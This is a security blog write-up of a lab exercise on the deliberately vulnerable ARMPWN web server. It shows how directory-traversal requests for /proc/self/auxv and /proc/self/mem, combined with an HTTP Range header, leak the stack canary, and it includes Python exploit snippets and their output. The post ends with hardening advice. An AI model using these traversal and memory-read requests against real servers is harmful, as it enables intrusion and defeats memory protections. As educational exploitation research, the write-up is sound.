+++
title = "ARMPWN redux: canary reloaded"
author = "hugsy"
date = 2017-01-24T00:00:00Z
updated = 2017-01-24T00:00:00Z

[taxonomies]
tags = ["linux,pwn,arm,ssp,armpwn"]
categories = [" ctf"]

[extra]
header-img = "img/canary-header.png"
+++

>
> __TL;DR__: It is possible to defeat stack canary protection when a binary is vulnerable to
> arbitrary file read.
>

# Intro

First of, Happy New Year 2017 ✌

Recently, I've decided to thoroughly investigate the "_Stack Smashing
Protection_" (SSP) on recent Linux and recent Glibc. This research has led to a
blog post available on [elttam R&D blog](https://www.elttam.com.au/blog). Among
many other things, I've found that canaries built with recent glibc may have
their values leaked, should the program be also vulnerable to an arbitrary file
read access, and if it exposes its
[Auxiliary Vector](https://www.elttam.com.au/blog/playing-with-canaries#auxiliary-vector) via
the `procfs` structure.

All the details regarding the following attack on the canary are explained in
this blog post, so I will assume that you are familiar with it. If you're not:

  * the full article is [here](https://www.elttam.com.au/blog/playing-with-canaries){:target="_blank"}
  * the code repository is [there](https://github.com/elttam/canary-fun){:target="_blank"}

In the article, I imagined the attack scenario would apply perfectly well to a
Web or FTP server, and would occur following those steps:

  1. dump `/proc/self/auxv` to get the `AT_RANDOM` location
  2. read `/proc/self/mem` and force an `lseek` access to reach the location found
     above via
     the [HTTP header Range](https://tools.ietf.org/html/rfc7233#page-8){:target="_blank"} (for
     instance `Range: bytes=<0xAT_RANDOM_LOCATION>-<0xAT_RANDOM_LOCATION+16>`)
  3. Truncate the received buffer to `sizeof(register)`
  4. Nullify the last byte (`result &= ~0xff`)

That was the theory, which made perfect sense, but I wanted a practice
case.

Earlier this year, I [had some fun with ARMPWN](/posts/2016/06/13/armpwn-challenge-write-up.html){:target="_blank"}, a vulnerable web server
created by  <a class="fa fa-twitter" href="https://twitter.com/5aelo" target="_blank"> @5aelo</a> to practice
exploitation on ARM, so I have decided to use it for a practical, yet very
realistic exploit case.

You can download:

  - [the new websrv.c here](https://gist.github.com/00d74ecac86297efc6772e415f307176){:target="_blank"}
  - [or simply the patch here](https://gist.github.com/c2dbc3e3c11836dcebf53a2189f35976){:target="_blank"}


## Patch analysis

This cheap patch provides to the "new" `websrv` the (pseudo-)capability to
[parse the HTTP Range header](https://gist.github.com/hugsy/00d74ecac86297efc6772e415f307176#file-websrv-c-L181-L201){:target="_blank"}
provided by the client. This is basically how modern Web servers (Apache, nginx)
treat this header.

```c
unsigned long start, end;
char *ptr;
int r;

start = end = 0;
ptr = get_range_header(request, len);
if (ptr){
    if(get_ranges_from_header(ptr, &start, &end)==0){
        if (start && end){
            printf("%s:%d reading range of file '%s' from %u-%u\n", inet_ntoa(client.sin_addr), htons(client.sin_port), file, start, end);
            if (lseek(fileno(f), start, SEEK_SET)==-1){
                perror("lseek() failed:");
[...]
```

In the earlier exploit, we had exploited the Directory Traversal to dump the
process memory mapping (via `/proc/self/maps`) and defeat PIE & ASLR. To crush
SSP protection, we managed to get the canary value by brute-forcing it, which is
very noisy (the canary can be found in max. of 4*256=1024 HTTP requests on a
32-bit architecture, 2048 on 64-bit) and risky (the memory corruption may alert
of an on-going attack).

But now we can actually do much better: we have all the conditions
mentioned earlier to exfiltrate the canary's value, thanks to the ELF Auxiliary
Vector.


## Exploitation

This approach is a lot more stable and stealthier than canary brute-forcing,
since we don't rely on any memory corruption/process crash to determine the
valid bytes of the canary
[as we did before](/2016/06/12/armpwn-challenge#leaking-the-canary){:target="_blank"}.


### Find AT_RANDOM from the Auxiliary Vector

So first, we need to read the process _Auxiliary Vector_ exposed via `procfs`.

```python
s.send("GET ../../../../../proc/self/auxv HTTP/1.0\r\n\r\n")
```

And then parse the result:

```python
AT_RANDOM = 25
[...]
data = s.recv(1024)
for i in range(0, len(data), 8):
    code = struct.unpack("<I", data[i:i+4])[0]
    if code==AT_RANDOM:
        at_random_address = struct.unpack("<I", data[i+4:i+8])[0]
        break
```

If we did things correctly, this will store in the variable `at_random_address`
the address of the 16 random bytes provided by the kernel, used to create the
canary.


### (l)seeking the process memory via the HTTP Range header

Since `procfs` also exposes the process memory, we can use `/proc/<pid>/mem` to
seek to the address we've found at the step above.

```python
m = "GET ../../../../../proc/self/mem HTTP/1.0\r\n"
m+= "Range: bytes={:d}-{:d}\r\n\r\n".format(at_random_address,at_random_address+16)
s.send(m)
```


<div markdown="span" class="alert-warning"><i class="fa fa-info-circle">&nbsp;Warning:</i> `yama/ptrace_scope` must be set to 0 to be able to read the process</div>
memory.


### Fire!

The final exploitation script which combines all the steps described above can
be found [here](https://gist.github.com/hugsy/a462b398721bfb7e6bbd678b6d0e852b).

```text
$ python armpwn_leak_canary.py
[+] Connected to 'rpi2-1:80'
[+] Leaking AUVX
[+] AT_RANDOM=0xbe8409c5
[+] Forging HTTP request using Range
[+] Canary is 0xd998d300
```

To be we fetched the correct value for the canary of the remote process, we can use [this script](https://github.com/elttam/canary-fun/blob/master/read_canary_from_pid.py) locally to compare the values for the canary:

![image_alt](https://i.imgur.com/IWpuMIy.png)



## Conclusion

This exploitation shows a different way to leak the canary value, and therefore defeat the SSP protection. As you may have noticed, since this attack does not rely on memory corruption, it is extremely reliable. And it is also much faster: the canary brute-force can take up 4x256 (or resp. 8x256 for 64-bits) requests to determine, where this approach found the same value with only 2 requests.

This illustrates once again the need to maintain a system as hardened as possible, especially on production systems, since restricting `ptrace`, or refusing to expose AUXV like GrSec does, would defeat this attack.

Thanks for reading, and as usual drop me a line on IRC/Twitter/email for any question/comment ☕
